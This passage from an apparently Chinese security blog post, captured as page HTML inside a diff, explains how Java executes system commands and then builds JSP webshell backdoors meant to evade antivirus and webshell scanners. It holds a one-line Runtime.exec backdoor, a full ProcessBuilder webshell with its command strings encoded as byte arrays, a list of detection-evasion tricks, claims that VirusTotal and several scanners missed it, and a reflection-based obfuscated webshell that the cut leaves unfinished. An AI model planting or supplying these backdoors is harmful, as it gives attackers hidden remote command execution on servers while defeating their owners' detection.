@@ -1,0 +1,1259 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00：前言  JSP后门，一般是指文件名以.jsp等后缀结尾的，可运行于Java servlet及相关容器和组件内的通用JSP脚本。   本文主要讨论利用Java反射机制和Java类加载机制构造JSP系统命令执行后门，并绕过一般软件检测的方法。 0x01：Java执行系统命令的方法和原理  要构建JSP命令执行后门，首先需要了解Java语言执行系统命令的方法及其原理。通过查阅资料知道：目前Ja">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java执行系统命令">
+<meta property="og:url" content="http://alin.run/2020/08/04/java-using/index.html">
+<meta property="og:site_name" content="alin&#39;Blog">
+<meta property="og:description" content="0x00：前言  JSP后门，一般是指文件名以.jsp等后缀结尾的，可运行于Java servlet及相关容器和组件内的通用JSP脚本。   本文主要讨论利用Java反射机制和Java类加载机制构造JSP系统命令执行后门，并绕过一般软件检测的方法。 0x01：Java执行系统命令的方法和原理  要构建JSP命令执行后门，首先需要了解Java语言执行系统命令的方法及其原理。通过查阅资料知道：目前Ja">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetizut1tj30q30bagmr.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj1maj3j30fl094dgc.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj3vvogj30dx05874e.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj5u8b3j30e40h13zp.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj81vrbj30h70ewwfn.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjae4w5j30ac092weq.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjd7t2gj30cx061t9h.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjg0v0tj30qk0gpgmz.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjid574j30rb09rmxj.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjl9lolj30oz0db41f.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjqsy99j310j079n68.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjv50w8j30dz060gmc.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjyrjosj30d204wq34.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk1v4hsj31me0k0q9y.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk3e540j30lo09cq3n.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetk5sfknj30fa0hdach.jpg">
+<meta property="article:published_time" content="2020-08-04T07:50:43.000Z">
+<meta property="article:modified_time" content="2020-08-04T07:51:58.653Z">
+<meta property="article:author" content="alin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetizut1tj30q30bagmr.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://alin.run/2020/08/04/java-using/"/>
+
+
+
+
+
+  <title>java执行系统命令 | alin'Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5e6a61cde714ee04a36217a052cbca33";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">alin'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://alin.run/2020/08/04/java-using/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="alin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/mao.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="alin'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">java执行系统命令</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-04T15:50:43+08:00">
+                2020-08-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h3><p>  JSP后门，一般是指文件名以.jsp等后缀结尾的，可运行于Java servlet及相关容器和组件内的通用JSP脚本。</p>
+<p>  本文主要讨论利用Java反射机制和Java类加载机制构造JSP系统命令执行后门，并绕过一般软件检测的方法。</p>
+<h3 id="0x01：Java执行系统命令的方法和原理"><a href="#0x01：Java执行系统命令的方法和原理" class="headerlink" title="0x01：Java执行系统命令的方法和原理"></a>0x01：Java执行系统命令的方法和原理</h3><p>  要构建JSP命令执行后门，首先需要了解Java语言执行系统命令的方法及其原理。通过查阅资料知道：目前Java语言执行系统命令主要通过下面两个类的相关方法实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime</span><br><span class="line">java.lang.ProcessBuilder</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="JVM层面"><a href="#JVM层面" class="headerlink" title="JVM层面"></a>JVM层面</h4></li>
+</ul>
+<p>查阅 <a href="http://tool.oschina.net/apidocs/apidoc?api=jdk-zh" target="_blank" rel="noopener"><strong>Java 文档</strong></a> 可以发现，上面两个类，都是对java.lang.Process抽象类的实现</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetizut1tj30q30bagmr.jpg" alt="java.lang.Process类"></p>
+<p>Java语言中执行系统命令的方式，简单来说就是<strong>由JVM创建一个本机进程，加载对应的指令到进程的地址空间中，然后执行该指令</strong>。</p>
+<p>而<strong>java.lang.Runtime.getRuntime().exec()</strong>和 <strong>java.lang.ProcessBuilder.start()</strong>方法，其实就是创建一个进程的方法。</p>
+<ul>
+<li><h4 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h4><p>首先，进入java.lang.Runtime类中，发现Runtime类的构造器是private修饰的，所以无法直接获得Runtime类的实例，只能通过其getRuntime()方法来间接获取一个Runtime类的实例。</p>
+</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj1maj3j30fl094dgc.jpg" alt="Runtime的private构造方法"></p>
+<p>  跟随java.lang.Runtime.getRuntime()，进入exec()方法；然后不断跟踪代码，定位到如下方法中。可以看到，Runtime类实现的系统命令执行方法exec()，底层代码其实是调用了ProcessBuilder类。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj3vvogj30dx05874e.jpg" alt="Runtime.exec()方法"></p>
+<p>  然后我们定位到ProcessBuilder类代码中，我们知道ProcessBuilder类用start方法创建进程，所以找到start方法的相关代码。可以发现其底层代码是调用了java.lang.ProcessImpl类的start方法，最终实现创建本机进程，执行系统命令的功能。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj5u8b3j30e40h13zp.jpg" alt="ProcessBuilder.start()方法"></p>
+<p>  继续跟踪，发现ProcessImpl类的原型是一个继承自Process类的final类</p>
+<p><code>final class ProcessImpl extends Process{}</code></p>
+<p>  查看ProcessImpl的构造器，发现是private修饰的，所以无法直接在java.lang包外，直接调用ProcessImpl类。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private ProcessImpl(String cmd[],</span><br><span class="line">                    final String envblock,</span><br><span class="line">                    final String path,</span><br><span class="line">                    final long[] stdHandles,</span><br><span class="line">                    final boolean redirectErrorStream)</span><br><span class="line">    throws IOException</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续追踪ProcessImpl类的start方法，发现最后是返回了一个ProcessImpl 类的实例。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj81vrbj30h70ewwfn.jpg" alt="ProcessImpl.start()方法"></p>
+<p>总结一下，Java语言执行系统命令相关类和方法的调用关系表示如下图：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjae4w5j30ac092weq.jpg" alt="依存关系"></p>
+<h3 id="0x02：JSP标签"><a href="#0x02：JSP标签" class="headerlink" title="0x02：JSP标签"></a>0x02：JSP标签</h3><p> 在JSP页面中嵌入java代码，需要正确的使用JSP标签，这里顺带提一下。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ %&gt;    页面指令，设定页面属性和特征信息</span><br><span class="line">&lt;% %&gt;     java代码片段，不能在此声明方法</span><br><span class="line">&lt;%! %&gt;    java代码声明，声明全局变量或当前页面的方法</span><br><span class="line">&lt;%= %&gt;    Java表达式</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03：用ProcessBuilder绕过检测"><a href="#0x03：用ProcessBuilder绕过检测" class="headerlink" title="0x03：用ProcessBuilder绕过检测"></a>0x03：用ProcessBuilder绕过检测</h3><p>先看一个简单原始的执行系统命令的后门：</p>
+<p><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></p>
+<p>接收请求参数<strong>i</strong>传递的命令字符串，然后使用Runtime对象的exec()方法执行该命令。特点是命令无回显，会被杀。</p>
+<p>“Runtime”、”exec”字符串过于显眼，基本都会被查杀软件检测到。所以，可以使用ProcessBuilder类建立一个不那么轻易被杀的命令执行后门，命名为<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/ProcessBuilder-cmd.jsp" target="_blank" rel="noopener">ProcessBuilder-cmd.jsp</a>：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page pageEncoding=<span class="string">"utf-8"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line">&lt;FORM METHOD=<span class="string">"POST"</span> NAME=<span class="string">"form"</span> ACTION=<span class="string">"#"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"text"</span> NAME=<span class="string">"q"</span>&gt;</span><br><span class="line">    &lt;INPUT TYPE=<span class="string">"submit"</span> VALUE=<span class="string">"Fly"</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String op=<span class="string">"Got Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">    Boolean isWin;</span><br><span class="line">    <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">        isWin = <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        isWin = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (query != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ProcessBuilder pb;</span><br><span class="line">        <span class="keyword">if</span>(isWin) &#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">67</span>&#125;), query);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            pb = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>&#125;), <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">45</span>, <span class="number">99</span>&#125;), query);</span><br><span class="line">        &#125;</span><br><span class="line">        Process process = pb.start();</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(process.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">        sc.close();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;PRE&gt;</span><br><span class="line">    &lt;%= op %&gt;&gt;</span><br><span class="line">&lt;/PRE&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br><span class="line">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjd7t2gj30cx061t9h.jpg" alt="利用ProcessBuilder来执行命令"></p>
+<p>上述代码做的几点绕过检测的考虑：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 避免出现敏感变量名</span><br><span class="line">   如&quot;cmd&quot;、&quot;spy&quot;、&quot;exec&quot;、&quot;shell&quot;、&quot;execute&quot;、&quot;system&quot;、&quot;command&quot;等等</span><br><span class="line">2. 字符串拆解重组</span><br><span class="line">   将&quot;cmd&quot;、&quot;&#x2F;c&quot;和&quot;&#x2F;bin&#x2F;bash&quot;、&quot;-c&quot;等都做了处理，由字节转为字符串</span><br><span class="line">3. 使用Scanner接收回显</span><br><span class="line">   接收命令回显数据时，避免使用BufferedReader等常见手段</span><br><span class="line">4. 用fileSeparator来判断操作系统类型</span><br><span class="line">   一般使用System.getProperty&#x2F;getProperties获取操作系统的类型，这里使用路径分隔符简单判断，然后再选用&quot;cmd &#x2F;c&quot;或者&quot;&#x2F;bin&#x2F;bash -c&quot;来执行命令</span><br><span class="line">5. 不导入过多的包</span><br></pre></td></tr></table></figure>
+
+<p>虽然做的绕过考虑不多，还<strong>带有ProcessBuilder关键字</strong>，但还是没被以下软件和平台检测出来：</p>
+<p><strong>virustotal检测</strong>：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjg0v0tj30qk0gpgmz.jpg" alt="virustotal检测结果"></p>
+<p><strong>shellpub.com检测：</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjid574j30rb09rmxj.jpg" alt="shellpub.com检测结果"></p>
+<p><strong>D盾、安全狗、深信服Webshell扫描检测：</strong>只有故意放置的一个简单exec后门被查出来</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjl9lolj30oz0db41f.jpg" alt="本地软件检测结果"></p>
+<p><strong>OpenRASP团队 <a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a> 检测</strong>结果(引擎版本: 2018-0509-1000)：没有发现异常</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjqsy99j310j079n68.jpg" alt="scanner.baidu.com检测"></p>
+<h3 id="0x04：使用Java反射机制绕过检测"><a href="#0x04：使用Java反射机制绕过检测" class="headerlink" title="0x04：使用Java反射机制绕过检测"></a>0x04：使用Java反射机制绕过检测</h3><p>  Runtime类的exec方法在Webshell中用的多了，极易被后门查杀软件检测到，那么就不能用exec函数来执行系统命令了嘛？不然，还可以使用Java反射技术既绕过软件对”Runtime”、”exec”等关键词的检查又使用exec函数来执行系统命令。</p>
+<p>在运行时，对于一个类，能够获取这个类的所有属性和方法，对于一个对象，都能够调用它的任意一个方法和属性，这种动态获取信息和动态调用对象方法的功能称为java语言的反射机制。Java反射机制的来龙去脉比较复杂，这里再给出一段简介用来参考：</p>
+<blockquote>
+<p>Java Reflection makes it possible to inspect classes, interfaces, fields and methods at runtime, without knowing the names of the classes, methods etc. at compile time. It is also possible to instantiate new objects, invoke methods and get/set field values using reflection.</p>
+</blockquote>
+<h4 id="一-反射Runtime"><a href="#一-反射Runtime" class="headerlink" title="一. 反射Runtime"></a>一. 反射Runtime</h4><p>通过查阅<a href="http://tutorials.jenkov.com/java-reflection/index.html" target="_blank" rel="noopener">资料</a>，可写出利用反射机制调用Runtime类exec方法执行系统命令的一段示例代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String op = <span class="string">""</span>;</span><br><span class="line">Class rt = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">Method gr = rt.getMethod(<span class="string">"getRuntime"</span>);</span><br><span class="line">Method ex = rt.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Process e = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;),  <span class="string">"cmd /c ping www.baidu.com"</span>);</span><br><span class="line">Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">op = sc.hasNext() ? sc.next() : op;</span><br><span class="line">sc.close();</span><br><span class="line">System.out.print(op);</span><br></pre></td></tr></table></figure>
+
+<p>具体代码含义不浪费篇幅解释了，讲下代码的主要逻辑：</p>
+<ol>
+<li>获取Runtime类的Class对象</li>
+<li>分别获取Runtime类Class对象的getRuntime方法和exec方法的Method对象</li>
+<li>利用getRuntime方法的Method对象，进行invoke调用，获得Runtime对象实例</li>
+<li>利用exec方法的Method对象，进行invoke调用，执行系统命令</li>
+<li>获取命令执行输出并打印</li>
+</ol>
+<p>基于以上代码，然后就可以轻松创造出一个使用Java反射技术，既调用Runtime类exec函数执行系统命令， 又可以免杀的JSP后门了，命名为：<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/Runtime-reflect-cmd.jsp" target="_blank" rel="noopener">Runtime-reflect-cmd.jsp</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Scanner"</span> pageEncoding=<span class="string">"UTF-8"</span> %&gt;</span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;title&gt;Just For Fun&lt;/title&gt;</span><br><span class="line">&lt;BODY&gt;</span><br><span class="line">&lt;H3&gt;Build By LandGrey&lt;/H3&gt;</span><br><span class="line"></span><br><span class="line">&lt;FORM METHOD=POST ACTION=<span class="string">'#'</span>&gt;</span><br><span class="line">    &lt;INPUT name=<span class="string">'q'</span> type=text&gt;</span><br><span class="line">    &lt;INPUT type=submit value=<span class="string">'Fly'</span>&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getPicture</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String fileSeparator = String.valueOf(java.io.File.separatorChar);</span><br><span class="line">        <span class="keyword">if</span>(fileSeparator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            str = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">32</span>&#125;) + str;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            str =  <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">32</span>&#125;) + str;</span><br><span class="line">        &#125;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(new String(new byte[] &#123; 101, 120, 101, 99 &#125;), String.class).invoke(rt.getMethod(new String(new byte[] &#123; 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 &#125;)).invoke(null, new Object[]&#123;&#125;),  new Object[] &#123; str &#125;);</span><br><span class="line">        Scanner sc = <span class="keyword">new</span> Scanner(e.getInputStream()).useDelimiter(<span class="string">"\\A"</span>);</span><br><span class="line">        String result = <span class="string">""</span>;</span><br><span class="line">        result = sc.hasNext() ? sc.next() : result;</span><br><span class="line">        sc.close();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String name =<span class="string">"Input Nothing"</span>;</span><br><span class="line">    String query = request.getParameter(<span class="string">"q"</span>);</span><br><span class="line">    